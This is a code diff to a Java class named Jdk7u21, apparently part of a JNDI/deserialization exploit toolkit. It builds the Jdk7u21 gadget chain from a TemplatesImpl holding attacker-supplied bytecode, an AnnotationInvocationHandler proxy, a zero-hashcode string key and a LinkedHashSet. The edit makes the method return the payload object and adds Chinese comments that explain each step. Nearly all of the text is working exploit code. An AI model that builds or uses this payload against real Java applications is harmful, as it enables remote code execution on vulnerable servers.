@@ -8,7 +8,9 @@ import com.nu1r.jndi.gadgets.utils.Reflections;
 import javax.xml.transform.Templates;
 import java.io.ByteArrayOutputStream;
 import java.io.ObjectOutputStream;
+import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
 import java.util.HashMap;
 import java.util.LinkedHashSet;
 
@@ -50,40 +52,41 @@ import java.util.LinkedHashSet;
  */
 public class Jdk7u21 implements ObjectPayload<Object> {
 
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public Object getObject(PayloadType type, String... param) throws Exception {
         final Object templates = Gadgets.createTemplatesImpl(type, param);
 
+        // hashCode 为 0 的字符串
         String zeroHashCodeStr = "f5a5a608";
 
         HashMap map = new HashMap();
         map.put(zeroHashCodeStr, "foo");
 
-        InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
-        Reflections.setFieldValue(tempHandler, "type", Templates.class);
-        Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);
+        // 使用 AnnotationInvocationHandler 为 HashMap 创建动态代理
+        Class<?>       c           = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor<?> constructor = c.getDeclaredConstructors()[0];
+        constructor.setAccessible(true);
+        InvocationHandler tempHandler = (InvocationHandler) constructor.newInstance(Override.class, map);
 
+        // 反射写入 AnnotationInvocationHandler 的 type
+        Reflections.setFieldValue(tempHandler, "type", Templates.class);
+
+        // 为 Templates 创建动态代理
+        Templates proxy = (Templates) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
+                new Class[]{Templates.class}, tempHandler);
+
+        // LinkedHashSet 中放入 TemplatesImpl 以及动态代理类
         LinkedHashSet set = new LinkedHashSet(); // maintain order
         set.add(templates);
         set.add(proxy);
 
+        // 反射将 _auxClasses 和 _class 修改为 null
         Reflections.setFieldValue(templates, "_auxClasses", null);
         Reflections.setFieldValue(templates, "_class", null);
 
-        map.put(zeroHashCodeStr, templates); // swap in real object
+        // 向 map 中替换 tmpl 对象
+        map.put(zeroHashCodeStr, templates);
 
-        //序列化
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(set);
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
-    }
-
-    @Override
-    public Object getObject(String command) throws Exception {
-        return null;
+        return set;
     }
 
     public static boolean isApplicableJavaVersion() {
